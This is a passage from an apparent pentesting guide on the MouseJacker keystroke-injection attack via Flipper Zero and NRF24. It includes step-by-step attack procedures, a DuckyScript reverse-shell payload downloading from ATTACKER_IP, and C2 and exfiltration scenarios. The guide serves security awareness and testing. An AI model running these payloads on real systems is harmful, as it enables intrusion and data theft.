## 3. MouseJacker -- Deep Dive

### 3.1 What is MouseJacker

MouseJacker is an attack that exploits vulnerabilities in the communication protocol between wireless peripherals (mice, keyboards) and their USB dongles. Originally published by Bastille Networks in 2016 (researchers Marc Newlin and Balint Seeber), the attack allows you to:

- Inject keystroke sequences on a remote computer
- Take control of the cursor
- Execute arbitrary commands on the victim's operating system
- All via radio, without physical contact with the target PC

The attack works because many wireless peripherals send their data in the clear (without encryption) or with weak encryption, and the USB dongles do not adequately authenticate the device that connects.

### 3.2 How it works -- step by step

**Phase 1 -- Reconnaissance:**

The Flipper Zero with the NRF24 module scans the 126 channels looking for active transmissions. Wireless mice transmit packets every time they move or are clicked. The attacker looks for traffic patterns compatible with known protocols (Logitech Unifying, Microsoft, etc.).

**Phase 2 -- Target identification:**

Once activity is detected, the attacker identifies:

- The device's pipe address (typically 5 bytes)
- The RF channel in use
- The protocol being used
- The device type (mouse vs keyboard)

The pipe address is the key element. With this, the attacker can "talk" directly to the USB dongle as if they were the legitimate device.

**Phase 3 -- Locking onto the dongle:**

The attacker configures their NRF24 with:

- The same pipe address as the target device
- The same RF channel
- The same data rate
- The same packet format

At this point the USB dongle cannot distinguish between the legitimate mouse packets and those injected by the attacker.

**Phase 4 -- Payload injection:**

The attacker sends packets that simulate keyboard key presses. Even if the original device is a mouse, many dongles accept "keyboard" type packets on the same channel and address, because the Unifying protocol supports multiple device types simultaneously.

Typical payloads include:

- Opening a shell (Win+R on Windows, Ctrl+Alt+T on Linux)
- Downloading and executing a reverse shell
- Disabling the antivirus
- Creating a backdoor user
- Modifying security settings

**Phase 5 -- Execution:**

The commands are typed "on screen" on the victim's PC at the speed of the radio link. A complete payload can be executed in 2-5 seconds. The victim briefly sees windows opening and text being typed, but it's often too fast to react.

### 3.3 Vulnerable peripherals

**Logitech Unifying (pre-2016) -- ALL VULNERABLE:**

The pre-2016 Logitech Unifying protocol is the primary target:

- Mouse M185, M325, M510, M705, M570 (trackball)
- Keyboards K230, K270, K360, K400, K750
- Mouse+keyboard combos MK270, MK320, MK520
- Any device with an orange Unifying receiver (pre-firmware update)

Logitech released a firmware update in 2016 to (partially) mitigate the issue, but:

- Many users never update the dongle firmware
- Older dongles don't support the update
- Even after the update, some attack variants still work

**Cheap wireless mice (no-brand):**

- The majority of wireless mice under 15 euros don't use encryption
- Many use the NRF24L01+ or compatible clones
- Proprietary protocols that are often trivial to reverse-engineer
- No authentication mechanism
- Vulnerable by design

**Non-AES wireless keyboards:**

- Wireless keyboards that don't implement AES-128
- Some "encrypted" keyboards use XOR with a fixed key -- easily bypassable
- Microsoft Wireless Desktop keyboards before the 800 series
- Non-Unifying Logitech keyboards

**Devices that are NOT vulnerable:**

- Bluetooth peripherals (completely different protocol)
- Logitech with post-2016 updated firmware (partially)
- Keyboards with real AES-128 (Microsoft Wireless Desktop 800+)
- Peripherals with encrypted proprietary protocols (rare)
- Wired peripherals (obviously)

### 3.4 Attack variants

**Mouse Jacker (standard QWERTY):**

The main app. Works with QWERTY keyboard layout (US International). Procedure:

1. On the Flipper: GPIO > NRF24 > Mouse Jacker
2. The Flipper automatically scans channels
3. When it finds a device, it shows address and channel
4. Select the target
5. Choose the payload (pre-loaded or custom DuckyScript)
6. Execute the injection

**AZERTY Mouse Jacker:**

Identical to the previous one but with key mapping for AZERTY layout (France, Belgium). Essential when the target PC uses a French layout, otherwise the injected characters won't match what is typed.

Differences from QWERTY:

- Complete A/Q, Z/W, M mapping and special characters
- Handling of accented characters (e', e`, a`, u`, c cedilla)
- Support for AltGr (characters like @, #, {, }, [, ], etc.)

**Mouse Jacker MS:**

Optimized for Microsoft Wireless peripherals:

- MS proprietary protocol different from Logitech Unifying
- Reduced lock-on times for MS frequency hopping
- Handling of MS-specific packet formats
- Support for MS mouse extra functions (tilt scroll, side buttons)

### 3.5 Complete step-by-step procedure

**Preparation:**

1. Connect the NRF24L01+ module (PA+LNA recommended) to the Flipper Zero
2. Verify that the firmware supports NRF24 apps (Unleashed or RogueMaster recommended)
3. Prepare DuckyScript payloads and copy them to the Flipper's SD card (folder /ext/nrf24/mousejacker/)
4. Position yourself within range of the target (10-50m indoor with PA+LNA)

**Example payload (DuckyScript for Windows reverse shell):**

```
REM MouseJacker payload - Reverse Shell Windows
DELAY 500
GUI r
DELAY 300
STRING powershell -w hidden -nop -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/shell.ps1')"
ENTER
```

**Example payload (DuckyScript for opening notepad - non-destructive demo):**

```
REM Demo payload - opens notepad and writes a message
DELAY 500
GUI r
DELAY 300
STRING notepad.exe
ENTER
DELAY 500
STRING This PC is vulnerable to MouseJacker.
STRING Contact the IT team to update wireless peripherals.
```

**Scanning and attacking:**

1. On the Flipper: go to GPIO > NRF24 > Mouse Jacker
2. Wait for automatic channel scanning
3. The Flipper will show found devices with address and type
4. Select the desired target
5. Select the DuckyScript payload from the list
6. Press OK to start the injection
7. Observe the result on the target PC

**Troubleshooting:**

- If no devices are found: verify that the target is using the mouse (it must transmit packets)
- If injection fails: verify the keyboard layout (QWERTY vs AZERTY vs other)
- If the payload gets corrupted: reduce injection speed, add DELAY between commands
- If the channel changes: the Unifying protocol uses frequency hopping -- try again
- If range is insufficient: use the PA+LNA version with an external antenna

### 3.6 Demo scenarios

**Scenario 1 -- Corporate awareness:**

Objective: demonstrate to management the risk of unprotected wireless peripherals.

1. Identify a PC with a Logitech Unifying wireless mouse in the meeting room
2. From the hallway, execute MouseJacker
3. Inject a payload that opens notepad and writes a warning message
4. Show the result to attendees

Impact: visual and immediate. No damage but extremely high communication impact.

**Scenario 2 -- Lateral movement in a pentest:**

Objective: gain access to an internal PC that is not reachable via network.

1. From the compromised workstation, identify wireless peripherals nearby
2. Inject a payload that opens PowerShell and downloads a C2 agent
3. The new agent establishes a connection with the command server
4. The attacker now has access to two workstations

Impact: critical. Enables lateral movement without suspicious network traffic.

**Scenario 3 -- Exfiltration via HID:**

Objective: exfiltrate data from an air-gapped PC that uses wireless peripherals.

1. Inject commands that read sensitive files
2. Encode the content in base64
3. Inject commands that send the encoded data via DNS or HTTP
4. Receive the data on the attacker's server

> Personal note: MouseJacker is the attack that leaves jaws on the floor during demos. The first time I successfully executed it on a PC in the meeting room, from the hallway, the company's CISO immediately ordered the replacement of all wireless peripherals with Bluetooth or wired models. No PDF report has ever had the same impact as 10 seconds of live MouseJacker. Use it in demos -- it's the ultimate weapon for communicating wireless risk.

---
